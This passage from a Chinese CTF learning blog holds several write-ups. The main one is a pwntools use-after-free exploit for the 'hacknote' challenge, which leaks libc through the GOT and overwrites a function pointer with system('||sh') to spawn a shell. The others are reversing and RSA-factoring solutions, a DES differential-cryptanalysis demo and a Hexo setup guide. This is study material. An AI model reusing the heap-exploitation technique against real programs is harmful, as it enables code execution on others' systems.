title="hacknote题解"></a>hacknote题解</h2><p>分析完函数，弄懂整个程序后开始构造脚本了，首先我们要想办法泄露地址，因此要在第一次申请的堆栈内写入我们需要的地址，比如read()，然后用得到的read()函数实际地址减去libc中read的偏移量，得到程序加载libc的基址，再用这个基址加上system的偏移量，得到system函数在程序实际执行时的地址，最后再写入一次system的地址和字符串“sh”，执行后得到shell</p><p>想要往第一次申请的堆块中写入内容，就要利用到fastbin的特性，free后的堆块会放到fastbin链表的表尾，在之后申请同样大小的堆块时会先分配表尾的空间。所以我们先add两次，输入的context size等于16（这里只要大于8就行，也就是不要让两个context和ptr[0]free后在一个链表就行），然后都free掉（delete index0和index1），这时index0[0]在fastbin的16字节链表的表头，index1[0]在表尾，至于两个context则在fastbin的32字节链表。<br>当我们再add一个context size为8的index2时，index2[0]的16字节空间会利用fastbin16字节链表表尾的index1[0]，而context申请的16字节空间就在index0[0]的位置，这时候我们输入的context就会把index0的头部修改了。</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-22-25.png" alt="avatar"><br>可以看到我们add两次后的堆空间内容，这里我申请的context size为16，所以它给我对齐成了32字节（这里有点困惑，按理来说32位系统应该分配给我24字节的空间，delete后之后我尝试申请24字节的空间，给我的也是原本那片空间，可见的确是分配了32字节）</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-22-29.png" alt="avatar"><br>当我分别delete index0和index1然后申请了size=8的index2后<br>堆空间变了，原本index0[0]的空间内容变成了我输入的字符串“cccccccc”<br>然后就可以写我们的脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./hacknote"</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc_32.so.6',checksec=False)</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">//ldd hacknote得到在本机使用的库</span><br><span class="line">elf=ELF(<span class="string">'./hacknote'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">read_libc=libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_symbol=elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"16"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,<span class="string">"a"</span>*<span class="number">15</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"16"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,<span class="string">"a"</span>*<span class="number">15</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"8"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,p32(<span class="number">0x0804862b</span>)+p32(read_got))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"0"</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line">read_addr=u32(a[:<span class="number">4</span>])</span><br><span class="line">print(<span class="string">"a--------------"</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">"base_addr---------------"</span>)</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">base_addr=read_addr-read_libc</span><br><span class="line">system_addr=system_libc+base_addr</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"8"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,p32(system_addr)+<span class="string">"||sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里比较特别的就是system的参数要用到截断字符，因为之前print函数里是(<em>(void (__cdecl *</em>)(void *))ptr[v1])(ptr[v1]);这样调用堆块头指向的函数的，所以我们的system的参数实际上是p32(system_addr)+”sh”，也就是system（p32(system_addr)+”sh”）,这样显然不能实现system（”sh”）,所以就要用到截断字符”||”或者”;”了，<br>system(“hsasoijiojo||sh”)就等于system(“sh”)<br>另外system(“sh”)=system(“/bin/sh”)，两者效果是一样的。</p><p>参考链接：<a href="https://www.jianshu.com/p/12c7d96e0bd3" target="_blank" rel="noopener">https://www.jianshu.com/p/12c7d96e0bd3</a><br><a href="https://www.anquanke.com/post/id/150359#h2-24" target="_blank" rel="noopener">https://www.anquanke.com/post/id/150359#h2-24</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-31-上海嘉韦思杯wp-re</title>
      <link href="/passages/2019-3-31-%E4%B8%8A%E6%B5%B7%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AFwp-re/"/>
      <url>/passages/2019-3-31-%E4%B8%8A%E6%B5%B7%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AFwp-re/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-3-31-上海嘉韦思杯wp-re"><a href="#2019-3-31-上海嘉韦思杯wp-re" class="headerlink" title="2019-3-31-上海嘉韦思杯wp-re"></a>2019-3-31-上海嘉韦思杯wp-re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>看是pe文件，打开ida 打开olldbg<br><img src="/images/2019jiaweisibei/2019-3-31-re1.png" alt="avatar"><br>Main函数看到strcmp，输入第一个密码r0b0RUlez!<br>才发现又要输入第二个密码，这个出乎我的意料<br>Olldbg动调的时候一层层地F2设断点<br><img src="/images/2019jiaweisibei/2019-3-31-re1-2.png" alt="avatar"><br>通过level1后会调用0x004015EA，在0x004015EA设断点，然后到0x004015ea的int 3之后断了思路</p><p>这时候回到IDA搜索scanf之类的输入函数，然后看到了<br><img src="/images/2019jiaweisibei/2019-3-31-re1-3.png" alt="avatar"><br>关键函数在sub_401547</p><p>因为if语句里要为1才会输出dword_40ADA4的祝贺语句，所以函数要返回0（！0=1）<br>所以<em>a1要等于</em>(a2^2)才不会return 1，*a2是40AD98地址所在指针指向的字符串<br>在od的内存中打开40AD98<br><img src="/images/2019jiaweisibei/2019-3-31-re1-4.png" alt="avatar"><br>找到0x40AD98所在地址的指针（指向0x28FDCC）指向的偏移</p><p><img src="/images/2019jiaweisibei/2019-3-31-re1-5.png" alt="avatar"><br>将u1nnf21g按位与2后得到w3lld0ne<br>最后比较坑的一点是两个flag片段之间要加_<br>所以最终flag：flag{r0b0RUlez!_w3lld0ne}<br>re2</p><hr><p>这一题感觉比较坑，我的IDA有部分函数没办法转成伪代码，动调的时候才知道是从0x08048420开始程序<br><img src="/images/2019jiaweisibei/2019-3-31-re2-1.png" alt="avatar"></p><p>重点就三句<br><img src="/images/2019jiaweisibei/2019-3-31-re2-2.png" alt="avatar"><br>Jnz要进行跳转，执行下面的0x804848F,Incorrect！已经很明显是错误的了。<br>为了jnz跳转，就需要之前的test不等于0，因为test eax,eax相当于and eax，eax<br>所以想要标志位Z不为0，就只需要eax不为0，那样and eax，eax就不会为0<br>在32位系统中，eax是作为函数的返回值的，所以eax的值取决于sub_8048580函数的返回值，接下来重点分析该函数</p><p><img src="/images/2019jiaweisibei/2019-3-31-re2-3.png" alt="avatar"><br>这个函数很长，主要就是case 10-122，每次要嘛满足if return，要嘛continue继续下一次循环，函数的功能就是每次循环对比一位你输入的参数，接下来我们要找到return不为0的地方，经过每个return的挑选，我选中了case 107<br><img src="/images/2019jiaweisibei/2019-3-31-re2-4.png" alt="avatar"><br>挑选的依据在于v14在esp+37H的位置，在函数的开头有一个v5[(v3 + 64) % 128] = 1;<br>其中v5在esp+cH的位置，V3是我们输入的字符串每次循环指向的那一个字符<br>因为（0x37-0xC-64）%128=107，所以当我们输入107（也就是‘k’）字符的时候v14所在值就会置1，这里值得注意的是每轮循环都会memset，把所有v5之后的栈空间置0，所以每次循环，只会有一个参数等于1，所以不能通过多次循环来满足v14！=0的条件（因为没注意memset是在每轮循环中让我浪费了大量时间），然后就是让v2==12为true，这一点就是一点点逆推了，比如在上一轮中满足case 98，让v2=12，或者从v2=0顺推也行（v2就是我们输入的字符串的下标，根据v3 = *(_BYTE *)(a1 + v2);）<br>最后构造字符串链48,57,118,100,102,55,119,101, 102,105,106, 98 , 107<br>得到flag{09vdf7wefijbk}<br>rsa256</p><hr><p>最后附加一个rsa<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256.png" alt="avatar"><br>给了公钥文件和flag文件<br>公钥直接扔到<a href="http://tool.chacuo.net/cryptrsakeyparse" target="_blank" rel="noopener">http://tool.chacuo.net/cryptrsakeyparse</a><br>公私钥解密，得到公钥的N和E<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256-2.png" alt="avatar"><br>之后把模数N转成10进制扔到<br><a href="http://www.factordb.com" target="_blank" rel="noopener">http://www.factordb.com</a> 大数分解<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256-1.png" alt="avatar"></p><p>拿到q p后，放到脚本里生成私钥</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import math<br>import sys<br>from Crypto.PublicKey import RSA</p><p>keypair = RSA.generate(1024)</p><p>keypair.p = 273821108020968288372911424519201044333<br>keypair.q = 280385007186315115828483000867559983517<br>keypair.e = 65537</p><p>keypair.n = keypair.p * keypair.q<br>Qn = long((keypair.p-1) * (keypair.q-1))</p><p>i = 1<br>while (True):<br>    x = (Qn * i ) + 1<br>    if (x % keypair.e == 0):<br>        keypair.d = x / keypair.e<br>        break<br>    i += 1</p><p>private = open(‘private.pem’,’w’)<br>private.write(keypair.exportKey())<br>private.close()</p><p>该脚本来自<a href="https://blog.csdn.net/qq_31481187/article/details/70448108" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/70448108</a></p><p>之后用命令openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec得到flag文件flag.dec</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-28-DES一轮差分密码分析</title>
      <link href="/passages/2019-3-28-DES%E4%B8%80%E8%BD%AE%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/passages/2019-3-28-DES%E4%B8%80%E8%BD%AE%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="DES的差分分析攻击"><a href="#DES的差分分析攻击" class="headerlink" title="DES的差分分析攻击"></a>DES的差分分析攻击</h1><h2 id="差分密码分析介绍"><a href="#差分密码分析介绍" class="headerlink" title="差分密码分析介绍"></a>差分密码分析介绍</h2><p>差分密码分析是已知的攻击迭代密码（迭代一个简单的轮函数，比如DES，就是简单地根据F函数和密钥迭代N轮）最有效的方法之一，基本思想就是用过明文对的异或值对密文对的异或值的影响来还原密钥（也就是已知多对明文和密文，从而推测出密钥）。</p><h2 id="一轮DES的差分密码分析"><a href="#一轮DES的差分密码分析" class="headerlink" title="一轮DES的差分密码分析"></a>一轮DES的差分密码分析</h2><p>接下来用一轮的DES简单地演示一遍差分分析，附带python脚本</p><p>DES的密文是通过上一轮的R（32位），经过E-盒的扩充得到的E（48位），然后E与密钥经过PC-2置换的K（48位）异或后得到I，I经过分割后进入S盒，最终得到O，O经过P-盒置换得到P。（为了推理的简洁，之后的推论过程直接忽略E-盒置换和P-盒置换，因为这两个置换在差分分析的代码中加个逆置换就好了，所以下文中的E就是明文的右半部分，O就是密文的左半边部分）<br>从而得到以下公式<br>E⊕K=I<br>S（I）=O<br>之后我们还需要三个公式：<br>E’=（E） ⊕ (E#)<br>(E⊕K)⊕（E#⊕K）=（E⊕E#）（K⊕K）=E’<br>(E⊕K)⊕（E#⊕K）=I⊕I#=I’=E’</p><p>其中E和E#就是随机的一对明文，E’就是两者的异或值，同理可以得到I’、O’，在知道一对明文和轮函数（也就是DES的详细加密过程）的情况下，我们就能得到一对密文，从而得到E’、O’，因为K在不同明文的加密过程中是相同的，所以E’=I’，在知道I’、O’的情况下，我们也就能根据S-盒差分对应表得到可能的两个输入I、I#、接着通过已知的E、E#和多个可能的I、I#异或得到可能的K值，最后通过多对明文得到多个K值得集合，它们的唯一交集就是真正的K。</p><p>这里的难点在于O’通过S盒逆查找得到I’是有多种情况的，因为S盒是6位输入变成4位输出，这就造成了缺失，所以我们需要一个差分对应表，差分对应表的详情可以参考我的python代码<br><a href="https://github.com/starsdestinations/DES-differential-cryptanalysis/blob/master/S%E7%9B%92%E5%B7%AE%E5%88%86%E5%80%BC%E5%AF%B9%E5%BA%94%E8%A1%A8python%E5%AE%9E%E7%8E%B0" target="_blank" rel="noopener">https://github.com/starsdestinations/DES-differential-cryptanalysis/blob/master/S%E7%9B%92%E5%B7%AE%E5%88%86%E5%80%BC%E5%AF%B9%E5%BA%94%E8%A1%A8python%E5%AE%9E%E7%8E%B0</a></p><p>我们可以得到一个I’（input）与O’（output）的差分对应表<br><img src="/images/2019-3-28-DES/2019-3-28-21-42.png" alt="avatar"><br>顺便一提的是一对输入I和I#顺序对调后得到的I’是一样的，所以差分对应表中每个项的值都是偶数</p><p>下面进行一次演示，只针对S1盒，所以我们选择两个6位明文<br>假设明文为E=0x13（01 0011） 和E#=0x27（10 0111）<br>得到E’=E ⊕ E# =0x13 ⊕ 0x27=0x34=I’<br>对两个明文进行加密（在不知道密钥的情况下，直接把两个明文放入黑盒DES中加密），得到两个密文，两个密文的O’值为D<br>根据I’ O’查找差分对应表，得到有4对（8种）可能的I值，经过计算得到这六个值为0x06、0x10、0x16、0x1c、0x22、0x24、0x28、0x32<br>把两个明文E和E#分别与这八个可能的I值异或：<br>0x06⊕0x01=0x07    0x06⊕0x35=0x33<br>0x10⊕0x01=0x11    0x10⊕0x35=0x25<br>0x16⊕0x01=0x17    0x16⊕0x35=0x23<br>0x1c⊕0x01=0x1d    0x1c⊕0x35=0x29<br>0x22⊕0x01=0x23    0x22⊕0x35=0x17<br>0x24⊕0x01=0x25    0x24⊕0x35=0x11<br>0x28⊕0x01=0x29    0x28⊕0x35=0x1d<br>0x32⊕0x01=0x33    0x32⊕0x35=0x07<br>将得到的16种可能的K作为一个集合{07，11，17，1d，23，25，29，33}</p><p>接着再选择一对明文，比如21、15，同样的顺序得到可能的K合集{00，14，17，20，23，34}<br>两个集合的交集{17，23}就是K可能取的值</p><p>通过多个明文对一次次的差分分析，最后我们会得到只有一个参数的交集，那个唯一参数就是K值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-20-DES学习</title>
      <link href="/passages/2019-3-20-DES%E5%AD%A6%E4%B9%A0/"/>
      <url>/passages/2019-3-20-DES%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学中DES学习"><a href="#密码学中DES学习" class="headerlink" title="密码学中DES学习"></a>密码学中DES学习</h1><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><p>双射：既是单射又是满射的映射称为双射，亦称“一一映射”。<br>满射：值域任何元素都有至少有一个变量与之对应，那这个映射就叫做满射<br>单射：函数f被称为是单射时，对每一值域内的y，存在至多一个定义域内的x使得f(x) = y<br>双射的概念在书中介绍DES的函数f时出现</p><p>⊕异或，两边相同时为0，与0异或就是本身，对DES加解密的证明过程有帮助</p><h2 id="DES基础"><a href="#DES基础" class="headerlink" title="DES基础"></a>DES基础</h2><p><img src="/images/2019-3-20-DESlearning/2019-3-20-9-33.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-29.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-36.png" alt="avatar"><br>这是DES三个最重要的部分，在加解密的过程中，初始置换IP和PC-I是两个表格，比较特殊的是PC-I，PC-I只有56个表项，因为64位密钥实际上其中八的倍数位（初始是第一位）是前七位的奇校验，进行置换的时候会删掉八位校验码。</p><p><img src="/images/2019-3-20-DESlearning/2019-3-20-11-03.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-04.png" alt="avatar"><br>函数f：第一步是把32位的Ri根据E-盒进行扩充置换（这一步跟IP和PC-I差不多，只是置换表不一样而已），然后得到48位的结果（因为其中有16位会映射两个结果），之后和Ki（变换i轮后的密钥k）异或，得到的48位结果分成8组，每组都通过S-盒置换（8个S-盒都不一样），最后32位输出会进行一次P置换（就是简单的对应表）。</p><p><img src="/images/2019-3-20-DESlearning/2019-3-20-11-05.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-06.png" alt="avatar"><br>S-盒比较特殊，是一个4行*16列的查找表（每个项是一个4位二进制数），作为输入的每组的6位二进制数，头尾两位组成的数字作为行数，中间四位组成的数字作为列数（行列都以0为起始值），<br>比如输入1 0100 0，就是查找S-盒的10（头尾两位）行，0100列。</p><p>最后p盒置换表：</p><p><img src="/images/2019-3-20-DESlearning/phe.png" alt="avatar"></p><p>函数f中的S-盒引入了非线性，而E置换则引入了扩散，即让每一位明文对更多的密文产生影响，在DES中，16轮加密后每位密文都受到所有64位明文的影响。</p><p>最后是关于加解密为何只需要调换一下Ki的顺序（密钥变化加密的时候是左右两部分向左循环移位，其中1、2、9、16左移一位，其它轮移两位，解密时的Ki就是右移，其中第一轮不移位，2、9、16右移一位，其它轮两位），这里有一个证明公式，配合加解密的图就能看懂了（右上角的d代表解密）<br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-12.png" alt="avatar"><br>⊕异或，两边相同时为0，与0异或就是本身，对没有数学基础的人配合这一点就能理解证明公式最重要的最后一步了</p><h2 id="《深入浅出密码学》第三章学习困惑"><a href="#《深入浅出密码学》第三章学习困惑" class="headerlink" title="《深入浅出密码学》第三章学习困惑"></a>《深入浅出密码学》第三章学习困惑</h2><p><img src="/images/2019-3-20-DESlearning/2019-3-20-10-13.png" alt="avatar"><br>这里有个矛盾之处，上部分说了是左右两部分移位，下面却说要嘛左部分移位，要嘛右部分移位，根据下面说的28次移位后密钥左右各28位的两部分恢复原样判断这里的要嘛应该是翻译错误。<br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-20.png" alt="avatar"><br>这里的Ci和Di应该总共只有56位，感觉还是翻译错误</p><p>最后推荐《深入浅出密码学》这本书，挺适合基础薄弱的人看的，虽然部分数论证明过程还是挺难懂。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-14-Xman-teamfour题解</title>
      <link href="/passages/2019-3-14-Xman-teamfour%E9%A2%98%E8%A7%A3/"/>
      <url>/passages/2019-3-14-Xman-teamfour%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Xman冬令营结营赛题目teamfour题解"><a href="#Xman冬令营结营赛题目teamfour题解" class="headerlink" title="Xman冬令营结营赛题目teamfour题解"></a>Xman冬令营结营赛题目teamfour题解</h1><h2 id="第一步：APK文件逆向"><a href="#第一步：APK文件逆向" class="headerlink" title="第一步：APK文件逆向"></a>第一步：APK文件逆向</h2><p>apk文件的逆向工具有非常多种<br>1、dex-tool+jd-gui的组合<br>先把dex-tool文件中的bin文件夹和d2j_invoke.bat、d2j-dex2jar.bat以及想要转化的classes.dex文件放到同一个文件夹，然后打开命令行cd到该文件夹或者右键使用git bash工具打开命令行，输入 ./d2j-dex2jar.bat ./classes.dex，就会生成一个jar文件，随后就能用jd-gui打开这个jar文件，浏览java代码了<br>2、jadx或者jeb<br>jadx和jeb的使用相对而言都很简单，jadx打开bin目录下的jadx-gui.bat，在弹出的窗口的左上角选择打开对应的apk文件就能浏览java代码了，jeb同样，但区别是jeb打开apk文件后出来的是smali代码，这时候需要右键把smali转化成java代码，这一点感觉跟ida差不多</p><p>有以上这些工具就能初步地进行安卓逆向分析了，当然只是静态分析smali代码，apk中的c语言编写的jni则需要用ida进行静态分析</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p><img src="/images/1.png" alt="avatar"><br>这道题有一个坑，虽然在代码中看起来是要通过md5得到flag_one，然后通过des拿到flag_two，最后组合成flag，但实际上flag_one藏在res资源文件中的drawable文件内的图片内，用notepad打开文件搜索flag就能得到“This is only a half FLAG: AndroMan”<br>暂时到这，des加密实在看得头疼，手边没有root的手机没办法进行动态调试，手机未到的这两天先学习一下rsa和des加密。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-13-github+hexo搭建博客</title>
      <link href="/passages/2019-3-13-github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/passages/2019-3-13-github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="github-hexo搭建博客"><a href="#github-hexo搭建博客" class="headerlink" title="github+hexo搭建博客"></a>github+hexo搭建博客</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>创建github账号，新建项目,注意项目名一定要设置成以下格式：yourusername.github.io(其中yourusername是github的账号名)</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>下载git和nodejs（两个下载过程一路默认就好）</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>在电脑的某个位置创建一个文件，这个文件是用来存放hexo和本地网站的，之后在这个文件里鼠标右键选择git bash here（下载完git后右键就会多出这个选项）<br>输入 npm install -g hexo-cli 安装hexo，安装好后可以输入 hexo -v查看版本<br>随后初始化hexo，输入 hexo init myblog（myblog就是你的文件名）<br>这时候再输入 hexo g 和 hexo server，就可以打开浏览器输入localhost:4000,成功看到自己创建的本地网站</p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>接着输入git config –global user.name “yourname” 和 git config –global user.email “youremail”（这里的yourname和youremail是github的账号名和邮箱地址）<br>然后创建ssh，输入命令 ssh-keygen -t rsa -C “youremail”（之后一直回车）<br>ssh密钥创建完后根据提示在本地找到密钥文件，其中id_rsa是私钥，id_rsa.pub是公钥，要放到github上<br>在GitHub的setting中（不是项目的setting而是账号的setting），找到SSH keys的设置选项，把id_rsa.pub的内容复制上去</p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>这是最后一个步骤，在你创建的本地文件夹中，这时候应该有一个_config.yml文件，在这个文件的末尾修改成如下格式：<br>deploy:<br>  type: git<br>  repo: <a href="https://github.com/YourgithubName/YourgithubName.github.io.git" target="_blank" rel="noopener">https://github.com/YourgithubName/YourgithubName.github.io.git</a><br>  branch: master<br>其中YourggithubName记得改成自己的<br>接下来在之前的git bash 中输入<br>hexo clean<br>hexo g（生成本地静态页面，我的理解是把你在本地的修改适应到整个本地网站，比如你在\source_posts下创建一个md文件，输入hexo g后会自动在public\passages下生成对应名字的文件夹以及html页面）<br>hexo d（将本地网站的变动复制到远端github上）<br>然后你就能输入<a href="http://yourgithubname.github.io上看到自己搭建的网站了" target="_blank" rel="noopener">http://yourgithubname.github.io上看到自己搭建的网站了</a></p><h2 id="进阶技巧"><a href="#进阶技巧" class="headerlink" title="进阶技巧"></a>进阶技巧</h2><p>想变更主题就在/themes下用git bash输入命令 git clone <a href="http://themegithubaddress" target="_blank" rel="noopener">http://themegithubaddress</a> ，把hexo官网的主题文件clone到自己本地（每个主题都是一个github项目），记得不能在主题的github上选择下载zip，那样解压出来的主题是有问题的<br>然后在博客文件下的_config.yml（不是主题的那个_config.yml）中把theme字段后的默认主题名改成你clone下来的文件名（记得不是主题的名字，而是/theme下文件夹的名字）<br>之后的具体设置就要看相关主题的文档</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/44213627" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/44213627</a><br><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengxiongZz/p/7707219.html</a><br><a href="https://www.jianshu.com/p/f4cc5866946b" target="_blank" rel="noopener">https://www.jianshu.com/p/f4cc5866946b</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/passages/hello-world/"/>
      <url>/passages/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
